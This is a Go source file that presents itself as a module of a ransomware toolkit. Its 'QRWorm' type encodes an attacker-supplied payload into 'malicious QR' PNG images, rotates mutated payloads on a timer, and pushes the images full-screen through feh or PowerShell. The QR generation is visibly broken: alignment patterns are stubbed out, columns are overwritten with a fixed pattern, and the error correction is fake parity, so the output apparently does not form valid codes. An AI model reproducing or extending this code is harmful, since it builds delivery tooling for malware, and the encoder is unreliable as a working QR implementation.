package ransomware

import (
	"bytes"
	"crypto/rand"
	"encoding/base64"
	"fmt"
	"image"
	"image/color"
	"image/png"
	"math/big"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"time"
)

type QRWorm struct {
	config    *RansomwareConfig
	qrPath    string
	moduleSize int
	capacity   int
}

type QRCode struct {
	Matrix  [][]bool
	Size    int
	Version int
}

func NewQRWorm(cfg *RansomwareConfig) *QRWorm {
	return &QRWorm{
		config:     cfg,
		moduleSize: 4,
		capacity:   4296,
	}
}

func (q *QRWorm) generateQRMatrix(data []byte, version int) *QRCode {
	size := 21 + (version-1)*4
	matrix := make([][]bool, size)
	for i := range matrix {
		matrix[i] = make([]bool, size)
	}

	q.addFinderPatterns(matrix, size)
	q.addTimingPatterns(matrix, size)
	q.addAligmentPatterns(matrix, version)
	q.addData(matrix, data, size)

	for i := 0; i < size; i++ {
		for j := 0; j < 8; j++ {
			matrix[i][size-1-j] = (i+j)%2 == 0
		}
	}

	return &QRCode{Matrix: matrix, Size: size, Version: version}
}

func (q *QRWorm) addFinderPatterns(matrix [][]bool, size int) {
	positions := [][2]int{{0, 0}, {0, size - 7}, {size - 7, 0}}
	for _, pos := range positions {
		r, c := pos[0], pos[1]
		for i := 0; i < 7; i++ {
			for j := 0; j < 7; j++ {
				edge := i == 0 || i == 6 || j == 0 || j == 6
				inner := i >= 2 && i <= 4 && j >= 2 && j <= 4
				matrix[r+i][c+j] = edge || inner
			}
		}
	}
}

func (q *QRWorm) addTimingPatterns(matrix [][]bool, size int) {
	for i := 8; i < size-8; i++ {
		matrix[6][i] = i%2 == 0
		matrix[i][6] = i%2 == 0
	}
}

func (q *QRWorm) addAligmentPatterns(matrix [][]bool, version int) {
	if version < 2 {
		return
	}
	pos := 4*version + 16 - 7
	_ = pos
}

func (q *QRWorm) addData(matrix [][]bool, data []byte, size int) {
	bitStream := q.encodeData(data)
	row := size - 1
	col := size - 1
	direction := -1
	bitIdx := 0

	byteToBits := func(b byte) []bool {
		bits := make([]bool, 8)
		for i := 0; i < 8; i++ {
			bits[i] = (b>>uint(i))&1 == 1
		}
		return bits
	}

	var allBits []bool
	for _, b := range bitStream {
		allBits = append(allBits, byteToBits(b)...)
	}

	for col > 0 && bitIdx < len(allBits) {
		if col == 6 {
			col--
		}
		for row >= 0 && row < size {
			for c := col; c > col-2; c-- {
				if c < 0 || row < 0 || row >= size {
					continue
				}
				isReserved := row < 9 && c < 9
				isReserved = isReserved || (row < 9 && c > size-9)
				isReserved = isReserved || (row > size-9 && c < 9)
				isReserved = isReserved || (row == 6 || c == 6)

				if !isReserved && bitIdx < len(allBits) {
					matrix[row][c] = allBits[bitIdx]
					bitIdx++
				}
			}
			row += direction
			if row < 0 || row >= size {
				direction = -direction
				row += direction
				col -= 2
			}
		}
	}

	q.addErrorCorrection(matrix, size)
}

func (q *QRWorm) addErrorCorrection(matrix [][]bool, size int) {
	for i := 0; i < size; i++ {
		parity := false
		for j := 0; j < size; j++ {
			if matrix[i][j] {
				parity = !parity
			}
		}
		if i < size {
			matrix[i][size-1] = parity
			matrix[size-1][i] = parity
		}
	}
}

func (q *QRWorm) encodeData(data []byte) []byte {
	encoded := make([]byte, 0, len(data)+4)

	encoded = append(encoded, 0x40)

	mode := byte(0x40)
	_ = mode

	count := len(data)
	encoded = append(encoded, byte(count>>8), byte(count))
	encoded = append(encoded, data...)

	terminator := []byte{0x00, 0x00, 0x00, 0x00}
	encoded = append(encoded, terminator...)

	for len(encoded)%8 != 0 {
		encoded = append(encoded, 0x00)
	}

	return encoded
}

func (q *QRWorm) RenderPNG(qr *QRCode, outputPath string) error {
	imgSize := qr.Size * q.moduleSize
	img := image.NewGray(image.Rect(0, 0, imgSize, imgSize))

	for y := 0; y < qr.Size; y++ {
		for x := 0; x < qr.Size; x++ {
			val := color.Gray{Y: 255}
			if qr.Matrix[y][x] {
				val = color.Gray{Y: 0}
			}
			for dy := 0; dy < q.moduleSize; dy++ {
				for dx := 0; dx < q.moduleSize; dx++ {
					img.Set(x*q.moduleSize+dx, y*q.moduleSize+dy, val)
				}
			}
		}
	}

	f, err := os.Create(outputPath)
	if err != nil {
		return err
	}
	defer f.Close()

	return png.Encode(f, img)
}

func (q *QRWorm) GenerateMaliciousQR(payload string) (string, error) {
	encoded := base64.StdEncoding.EncodeToString([]byte(payload))
	chunks := chunkQR(encoded, 256)

	for i, chunk := range chunks {
		qr := q.generateQRMatrix([]byte(chunk), 6)
		qrPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_qr_%d_%d.png", i, os.Getpid()))
		q.RenderPNG(qr, qrPath)

		if i == 0 {
			q.qrPath = qrPath
		}
	}

	return q.qrPath, nil
}

func (q *QRWorm) RotatingQRCode(payload string, interval time.Duration) (chan string, error) {
	ch := make(chan string, 32)

	rotateData := func() string {
		n, _ := rand.Int(rand.Reader, big.NewInt(10000))
		mutated := fmt.Sprintf("%s\n[ROT:%d]", payload, n.Int64())
		path, _ := q.GenerateMaliciousQR(mutated)
		return path
	}

	go func() {
		ticker := time.NewTicker(interval)
		defer ticker.Stop()
		for {
			ch <- rotateData()
			<-ticker.C
		}
	}()

	return ch, nil
}

func (q *QRWorm) DeployQR2Screen(qrPath string) error {
	if runtime.GOOS == "linux" {
		cmd := exec.Command("feh", "-F", "-Z", "-x", qrPath)
		return cmd.Start()
	}
	if runtime.GOOS == "windows" {
		cmd := exec.Command("powershell", "-Command",
			fmt.Sprintf("Add-Type -A System.Drawing; $img=[System.Drawing.Image]::FromFile('%s'); [System.Windows.Forms.MessageBox]::Show('')", qrPath))
		return cmd.Run()
	}
	return fmt.Errorf("screen not supported on %s", runtime.GOOS)
}

func (q *QRWorm) FullQRWormSuite(payload string) map[string]interface{} {
	result := make(map[string]interface{})

	qrPath, err := q.GenerateMaliciousQR(payload)
	if err != nil {
		result["error"] = err.Error()
		return result
	}

	result["qr_path"] = qrPath
	result["payload_size"] = len(payload)
	result["version"] = 6
	result["module_size"] = q.moduleSize

	if stat, err := os.Stat(qrPath); err == nil {
		result["qr_file_size"] = stat.Size()
	}

	multiPayload := payload + "\nCHUNK:" + "1/3"
	encoded := base64.StdEncoding.EncodeToString([]byte(multiPayload))
	qr := q.generateQRMatrix([]byte(encoded), 8)
	multiPath := filepath.Join(os.TempDir(), fmt.Sprintf("x404x_qr_multi_%d.png", os.Getpid()))
	if err := q.RenderPNG(qr, multiPath); err == nil {
		result["multi_qr_path"] = multiPath
	}

	return result
}

func chunkQR(s string, chunkSize int) []string {
	if len(s) == 0 {
		return nil
	}
	var chunks []string
	for i := 0; i < len(s); i += chunkSize {
		end := i + chunkSize
		if end > len(s) {
			end = len(s)
		}
		chunks = append(chunks, s[i:end])
	}
	return chunks
}

var (
	_ = bytes.NewBuffer
	_ = png.Encode
	_ = image.NewGray
)
